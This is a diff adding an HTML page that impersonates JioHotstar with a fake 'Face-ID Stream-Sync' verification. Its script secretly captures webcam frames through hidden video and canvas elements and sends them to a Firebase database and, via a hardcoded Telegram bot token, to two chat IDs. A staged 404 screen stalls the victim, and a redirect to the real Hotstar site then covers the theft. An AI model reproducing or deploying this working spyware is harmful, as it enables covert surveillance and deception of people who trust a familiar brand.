@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JioHotstar | Stream-Sync Verification</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --jh-blue: #0A1E32;
+            --jh-accent: #2196F3;
+            --jh-gradient: linear-gradient(135deg, #0A1E32 0%, #06111C 100%);
+            --jh-text: #FFFFFF;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--jh-gradient); 
+            color: var(--jh-text);
+            font-family: 'Roboto', sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .jh-header {
+            padding: 15px 5%; background: rgba(0,0,0,0.5);
+            display: flex; align-items: center; justify-content: space-between;
+            backdrop-filter: blur(10px);
+        }
+
+        .jh-logo { font-size: 22px; font-weight: 900; letter-spacing: -1px; }
+        .jh-logo span { color: var(--jh-accent); }
+
+        .content-area {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px;
+        }
+
+        .sync-card {
+            width: 100%; max-width: 420px; 
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px; padding: 40px; text-align: center;
+            backdrop-filter: blur(15px);
+        }
+
+        .biometric-visual {
+            width: 100px; height: 100px; margin: 0 auto 25px;
+            border: 1px solid var(--jh-accent); border-radius: 24px;
+            position: relative; display: flex; align-items: center; justify-content: center;
+        }
+
+        .scan-bar {
+            position: absolute; width: 80%; height: 2px;
+            background: var(--jh-accent); box-shadow: 0 0 15px var(--jh-accent);
+            animation: move-scan 2.5s infinite ease-in-out;
+        }
+        @keyframes move-scan { 0%, 100% { top: 20%; } 50% { top: 80%; } }
+
+        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 500; }
+        p { font-size: 14px; color: #8f98a0; line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-sync {
+            background: var(--jh-accent); color: white; border: none;
+            width: 100%; padding: 16px; font-size: 16px; font-weight: 600;
+            border-radius: 12px; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.3);
+        }
+        .btn-sync:hover { transform: translateY(-2px); filter: brightness(1.1); }
+
+        /* Sync State & 404 */
+        #sync-ui, #error-404 { display: none; }
+
+        .node-status {
+            font-family: monospace; font-size: 11px; color: #5a6a7a;
+            margin-top: 20px; display: flex; justify-content: center; gap: 10px;
+        }
+
+        .pulse { width: 8px; height: 8px; background: #4CAF50; border-radius: 50%; display: inline-block; animation: pulse-anim 1.5s infinite; }
+        @keyframes pulse-anim { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+
+        /* 404 Error */
+        .err-404-text { font-size: 80px; font-weight: 800; opacity: 0.1; margin-bottom: -20px; }
+    </style>
+</head>
+<body>
+
+    <div class="jh-header">
+        <div class="jh-logo">Jio<span>Hotstar</span></div>
+    </div>
+
+    <div class="content-area">
+        <!-- Initial Interaction -->
+        <div class="sync-card" id="init-view">
+            <div class="biometric-visual">
+                <div class="scan-bar"></div>
+                <svg width="40" height="40" fill="var(--jh-accent)" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-5-9h10v2H7z"/></svg>
+            </div>
+            <h2>Regional Verification</h2>
+            <p>JioHotstar Mumbai servers require a <b>Spatial Stream-Sync</b> to verify your local VIP subscription. Please enable the Face-ID handshake to continue streaming.</p>
+            
+            <button class="btn-sync" onclick="startJioSync()">Confirm & Sync</button>
+            <div class="node-status"><span class="pulse"></span> HUB: MUMBAI-SOUTH-01</div>
+        </div>
+
+        <!-- Syncing State -->
+        <div class="sync-card" id="sync-ui">
+            <div class="biometric-visual" style="border-radius: 50%; border-style: dashed;">
+                <div class="scan-bar" style="background: #ffeb3b; box-shadow: 0 0 15px #ffeb3b;"></div>
+                <div style="font-weight: bold; color: var(--jh-accent);" id="perc">0%</div>
+            </div>
+            <h2>Processing ID...</h2>
+            <p>Matching facial vectors with your Jio Aadhaar-linked profile for high-security playback. Do not close the window.</p>
+            
+            <div style="text-align: left; background: #000; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 10px; color: #4CAF50;">
+                [SYS] CONNECTING_TO_JIO_BACKEND...<br>
+                [SYS] RETRIEVING_MUMBAI_LOCATION_BLOB...<br>
+                [SYS] STATUS: UPLOADING_ENCRYPTED_SYNC
+            </div>
+        </div>
+
+        <!-- 404 Error State -->
+        <div class="sync-card" id="error-404">
+            <div class="err-404-text">404</div>
+            <h2 style="color: #f44336;">Regional Node Congestion</h2>
+            <p>The Mumbai-South-01 node is experiencing high traffic. Retrying visual handshake to secure your priority streaming slot and bypass the queue.</p>
+            <div class="node-status" style="color: #f44336;"><span class="pulse" style="background:#f44336;"></span> RETRYING_HANDSHAKE_02</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startJioSync() {
+            try {
+                // Requesting camera under "Face-ID DRM" guise
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        let progress = Math.min(Math.floor((count / 50) * 100), 99);
+                        document.getElementById('perc').innerText = progress + "%";
+
+                        if (count <= 55) {
+                            jioCapture(count);
+                        }
+
+                        // Trigger fake 404 error halfway
+                        if (count === 35) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.hotstar.com/in";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.hotstar.com";
+            }
+        }
+
+        function jioCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "JIOHOTSTAR_SYNC_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_SOUTH_HUB" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'jio_stream_sync_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
